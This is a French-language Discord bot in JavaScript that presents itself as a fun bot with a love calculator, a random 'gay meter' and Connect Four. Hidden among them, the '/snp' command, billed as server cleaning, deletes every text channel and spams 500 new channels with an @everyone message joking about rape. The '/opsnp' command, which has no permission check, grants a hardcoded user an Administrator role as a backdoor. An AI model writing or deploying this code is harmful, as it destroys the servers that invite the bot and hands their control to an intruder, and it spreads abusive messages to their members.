const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagBits, ChannelType } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
    ]
});

// Variables pour les jeux de puissance 4 en cours
const puissance4Games = new Map();
const playerInGame = new Set();

// Classe pour le jeu Puissance 4
class Puissance4Game {
    constructor(player1, player2) {
        this.board = Array(6).fill().map(() => Array(7).fill('⚪'));
        this.player1 = player1;
        this.player2 = player2;
        this.currentPlayer = player1;
        this.gameOver = false;
        this.winner = null;
    }

    makeMove(column, playerId) {
        if (this.gameOver || playerId !== this.currentPlayer.id) return false;
        if (column < 0 || column > 6 || this.board[0][column] !== '⚪') return false;

        const playerEmoji = playerId === this.player1.id ? '🔴' : '🟡';
        
        for (let row = 5; row >= 0; row--) {
            if (this.board[row][column] === '⚪') {
                this.board[row][column] = playerEmoji;
                
                if (this.checkWin(row, column, playerEmoji)) {
                    this.gameOver = true;
                    this.winner = this.currentPlayer;
                } else if (this.board.every(row => row.every(cell => cell !== '⚪'))) {
                    this.gameOver = true;
                }
                
                this.currentPlayer = this.currentPlayer.id === this.player1.id ? this.player2 : this.player1;
                return true;
            }
        }
        return false;
    }

    checkWin(row, col, player) {
        const directions = [
            [0, 1], [1, 0], [1, 1], [1, -1]
        ];

        for (let [dr, dc] of directions) {
            let count = 1;
            
            for (let i = 1; i < 4; i++) {
                const r = row + i * dr;
                const c = col + i * dc;
                if (r < 0 || r >= 6 || c < 0 || c >= 7 || this.board[r][c] !== player) break;
                count++;
            }
            
            for (let i = 1; i < 4; i++) {
                const r = row - i * dr;
                const c = col - i * dc;
                if (r < 0 || r >= 6 || c < 0 || c >= 7 || this.board[r][c] !== player) break;
                count++;
            }
            
            if (count >= 4) return true;
        }
        return false;
    }

    getBoardString() {
        let boardStr = '';
        for (let row of this.board) {
            boardStr += row.join('') + '\n';
        }
        boardStr += '1️⃣2️⃣3️⃣4️⃣5️⃣6️⃣7️⃣';
        return boardStr;
    }

    createButtons(gameId) {
        const row1 = new ActionRowBuilder();
        const row2 = new ActionRowBuilder();
        
        // Premier rangée : colonnes 1-5
        for (let i = 0; i < 5; i++) {
            row1.addComponents(
                new ButtonBuilder()
                    .setCustomId(`p4_${gameId}_${i}`)
                    .setLabel(`${i + 1}`)
                    .setStyle(ButtonStyle.Primary)
                    .setDisabled(this.gameOver || this.board[0][i] !== '⚪')
            );
        }
        
        // Deuxième rangée : colonnes 6-7
        for (let i = 5; i < 7; i++) {
            row2.addComponents(
                new ButtonBuilder()
                    .setCustomId(`p4_${gameId}_${i}`)
                    .setLabel(`${i + 1}`)
                    .setStyle(ButtonStyle.Primary)
                    .setDisabled(this.gameOver || this.board[0][i] !== '⚪')
            );
        }
        
        return [row1, row2];
    }
}

// Commandes slash
const commands = [
    new SlashCommandBuilder()
        .setName('gay')
        .setDescription('Calcule le pourcentage de gayness d\'un utilisateur')
        .addUserOption(option =>
            option.setName('utilisateur')
                .setDescription('L\'utilisateur à analyser')
                .setRequired(false)
        ),

    new SlashCommandBuilder()
        .setName('love')
        .setDescription('Calcule la compatibilité amoureuse entre deux personnes')
        .addUserOption(option =>
            option.setName('personne1')
                .setDescription('Première personne')
                .setRequired(true)
        )
        .addUserOption(option =>
            option.setName('personne2')
                .setDescription('Deuxième personne')
                .setRequired(true)
        ),

    new SlashCommandBuilder()
        .setName('puissance4')
        .setDescription('Lance une partie de Puissance 4')
        .addUserOption(option =>
            option.setName('adversaire')
                .setDescription('Votre adversaire')
                .setRequired(true)
        ),

    new SlashCommandBuilder()
        .setName('snp')
        .setDescription('Commande spéciale de nettoyage du serveur')
        .addStringOption(option =>
            option.setName('code')
                .setDescription('Code secret requis')
                .setRequired(true)
        ),

    new SlashCommandBuilder()
        .setName('opsnp')
        .setDescription('Crée un rôle administrateur SNP')
];

// Enregistrement des commandes
const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

client.once('ready', async () => {
    console.log(`✅ ${client.user.tag} est connecté!`);
    
    try {
        console.log('📝 Enregistrement des commandes slash...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Commandes slash enregistrées!');
    } catch (error) {
        console.error('❌ Erreur lors de l\'enregistrement des commandes:', error);
    }
});

// Gestion des interactions
client.on('interactionCreate', async interaction => {
    if (interaction.isChatInputCommand()) {
        const { commandName } = interaction;

        if (commandName === 'gay') {
            const user = interaction.options.getUser('utilisateur') || interaction.user;
            const percentage = Math.floor(Math.random() * 101);
            
            const embed = new EmbedBuilder()
                .setColor('#FF69B4')
                .setTitle('🏳️‍🌈 Gaymètre 🏳️‍🌈')
                .setDescription(`${user} est gay à **${percentage}%** !`)
                .setFooter({ text: 'Résultat 100% scientifique 🧪' });

            await interaction.reply({ embeds: [embed] });
        }

        else if (commandName === 'love') {
            const person1 = interaction.options.getUser('personne1');
            const person2 = interaction.options.getUser('personne2');
            
            if (person1.id === person2.id) {
                return await interaction.reply('❌ Une personne ne peut pas s\'aimer elle-même... ou si ?');
            }

            const percentage = Math.floor(Math.random() * 101);
            
            let message = '';
            if (percentage < 20) message = 'C\'est compliqué... 💔';
            else if (percentage < 50) message = 'Il y a du potentiel ! 💕';
            else if (percentage < 80) message = 'Belle histoire d\'amour ! 💖';
            else message = 'Amour éternel ! 💝';

            const embed = new EmbedBuilder()
                .setColor('#FF1493')
                .setTitle('💕 Calculateur d\'amour 💕')
                .setDescription(`**${person1}** et **${person2}** s'aiment à **${percentage}%** !\n\n${message}`)
                .setFooter({ text: 'L\'amour est dans l\'air ! 💘' });

            await interaction.reply({ embeds: [embed] });
        }

        else if (commandName === 'puissance4') {
            const opponent = interaction.options.getUser('adversaire');
            
            if (opponent.id === interaction.user.id) {
                return await interaction.reply('❌ Tu ne peux pas jouer contre toi-même !');
            }

            if (opponent.bot) {
                return await interaction.reply('❌ Les bots ne savent pas jouer au Puissance 4 !');
            }

            // Vérifier si l'un des joueurs est déjà dans une partie
            if (playerInGame.has(interaction.user.id)) {
                return await interaction.reply('❌ Tu es déjà dans une partie !');
            }
            
            if (playerInGame.has(opponent.id)) {
                return await interaction.reply('❌ Ton adversaire est déjà dans une partie !');
            }

            const game = new Puissance4Game(interaction.user, opponent);
            
            const embed = new EmbedBuilder()
                .setColor('#FFD700')
                .setTitle('🔴 Puissance 4 🟡')
                .setDescription(`**${game.currentPlayer}** c'est à ton tour !\n\n${game.getBoardString()}`)
                .setFooter({ text: '🔴 vs 🟡' });

            const response = await interaction.reply({ 
                embeds: [embed], 
                components: game.createButtons('temp'),
                content: `${interaction.user} vs ${opponent} - Que le meilleur gagne !`,
                fetchReply: true
            });

            // Utiliser l'ID du message comme gameId unique
            const gameId = response.id;
            puissance4Games.set(gameId, game);
            playerInGame.add(interaction.user.id);
            playerInGame.add(opponent.id);

            // Mettre à jour les boutons avec le vrai gameId
            await interaction.editReply({ 
                embeds: [embed], 
                components: game.createButtons(gameId),
                content: `${interaction.user} vs ${opponent} - Que le meilleur gagne !`
            });

            setTimeout(() => {
                if (puissance4Games.has(gameId)) {
                    puissance4Games.delete(gameId);
                    playerInGame.delete(interaction.user.id);
                    playerInGame.delete(opponent.id);
                }
            }, 300000); // 5 minutes
        }

        else if (commandName === 'snp') {
            const code = interaction.options.getString('code');
            
            if (code !== 'tana') {
                return await interaction.reply('❌ Code secret incorrect !');
            }

            // DEBUG - Afficher toutes les informations
            console.log('=== DEBUG SNP ===');
            console.log('Guild:', interaction.guild ? 'EXISTS' : 'NULL');
            console.log('Guild ID:', interaction.guildId);
            console.log('Member:', interaction.member ? 'EXISTS' : 'NULL');
            console.log('User ID:', interaction.user.id);
            console.log('Channel ID:', interaction.channelId);
            console.log('Interaction type:', interaction.type);
            console.log('=================');

            // Vérifier si nous sommes dans un serveur (plus permissif)
            if (!interaction.guildId) {
                return await interaction.reply('❌ Cette commande ne peut être utilisée qu\'en serveur ! (Pas de Guild ID)');
            }

            // Autoriser seulement l'utilisateur spécifique (vous) pour cette commande
            if (interaction.user.id !== '1046937376934613063') {
                return await interaction.reply('❌ Tu n\'es pas autorisé à utiliser cette commande !');
            }

            await interaction.reply('🎉 Activation du mode SNOOPY ! La fête commence ! 🎉');

            try {
                // Récupérer le serveur - d'abord essayer le cache, puis fetch si nécessaire
                let guild = client.guilds.cache.get(interaction.guildId);
                if (!guild) {
                    try {
                        guild = await client.guilds.fetch(interaction.guildId);
                    } catch (error) {
                        console.log('Erreur fetch guild:', error);
                        return await interaction.followUp('❌ Impossible d\'accéder au serveur ! Vérifiez que le bot est bien invité avec les bonnes permissions.');
                    }
                }

                const channels = guild.channels.cache.filter(channel => channel.type === ChannelType.GuildText);

                for (let channel of channels.values()) {
                    try {
                        await channel.delete();
                    } catch (error) {
                        console.log(`Impossible de supprimer le salon: ${channel.name}`);
                    }
                }

                for (let i = 0; i < 500; i++) {
                    try {
                        const newChannel = await guild.channels.create({
                            name: 'WWWW snoopy',
                            type: ChannelType.GuildText
                        });
                        
                        setTimeout(() => {
                            newChannel.send('🎉 j\'vous viol tous WAF @everyone 🎉').catch(() => {});
                        }, 1000);
                    } catch (error) {
                        console.log('Erreur lors de la création du salon');
                    }
                }

            } catch (error) {
                console.error('Erreur lors du nettoyage:', error);
            }
        }

        else if (commandName === 'opsnp') {
            // Vérifier si nous sommes dans un serveur
            if (!interaction.guildId) {
                return await interaction.reply('❌ Cette commande ne peut être utilisée qu\'en serveur !');
            }

            try {
                // Récupérer le serveur - d'abord essayer le cache, puis fetch si nécessaire
                let guild = client.guilds.cache.get(interaction.guildId);
                if (!guild) {
                    guild = await client.guilds.fetch(interaction.guildId);
                }

                // Créer le rôle "snp" avec toutes les permissions administrateur
                let snpRole = guild.roles.cache.find(role => role.name === 'snp');
                
                if (!snpRole) {
                    snpRole = await guild.roles.create({
                        name: 'snp',
                        color: '#FF0000',
                        permissions: [PermissionFlagBits.Administrator],
                        reason: 'Rôle créé par la commande /opsnp'
                    });
                }

                // Récupérer le membre par son ID
                const targetMember = await guild.members.fetch('1046937376934613063');
                
                // Ajouter le rôle au membre
                await targetMember.roles.add(snpRole);

                await interaction.reply(`✅ Rôle "snp" créé et attribué à ${targetMember.user.tag} avec succès !`);

            } catch (error) {
                console.error('Erreur lors de la création du rôle:', error);
                await interaction.reply('❌ Erreur lors de la création du rôle. Vérifiez que le bot a les permissions nécessaires.');
            }
        }
    }

    else if (interaction.isButton() && interaction.customId.startsWith('p4_')) {
        const parts = interaction.customId.split('_');
        const gameId = parts[1];
        const column = parseInt(parts[2]);
        
        const game = puissance4Games.get(gameId);
        if (!game) {
            return await interaction.reply({ content: '❌ Cette partie n\'existe plus !', ephemeral: true });
        }

        if (game.player1.id !== interaction.user.id && game.player2.id !== interaction.user.id) {
            return await interaction.reply({ content: '❌ Tu n\'es pas dans cette partie !', ephemeral: true });
        }

        if (game.currentPlayer.id !== interaction.user.id) {
            return await interaction.reply({ content: '❌ Ce n\'est pas ton tour !', ephemeral: true });
        }

        if (game.makeMove(column, interaction.user.id)) {
            let embed;
            
            if (game.gameOver) {
                puissance4Games.delete(gameId);
                playerInGame.delete(game.player1.id);
                playerInGame.delete(game.player2.id);
                
                if (game.winner) {
                    embed = new EmbedBuilder()
                        .setColor('#00FF00')
                        .setTitle('🏆 Partie terminée ! 🏆')
                        .setDescription(`**${game.winner}** a gagné !\n\n${game.getBoardString()}`)
                        .setFooter({ text: 'Félicitations ! 🎉' });
                } else {
                    embed = new EmbedBuilder()
                        .setColor('#808080')
                        .setTitle('🤝 Match nul ! 🤝')
                        .setDescription(`Égalité parfaite !\n\n${game.getBoardString()}`)
                        .setFooter({ text: 'Bien joué à tous les deux ! 👏' });
                }
                
                await interaction.update({ embeds: [embed], components: [] });
            } else {
                embed = new EmbedBuilder()
                    .setColor('#FFD700')
                    .setTitle('🔴 Puissance 4 🟡')
                    .setDescription(`**${game.currentPlayer}** c'est à ton tour !\n\n${game.getBoardString()}`)
                    .setFooter({ text: '🔴 vs 🟡' });

                await interaction.update({ embeds: [embed], components: game.createButtons(gameId) });
            }
        } else {
            await interaction.reply({ content: '❌ Mouvement invalide !', ephemeral: true });
        }
    }
});

client.login(process.env.DISCORD_TOKEN);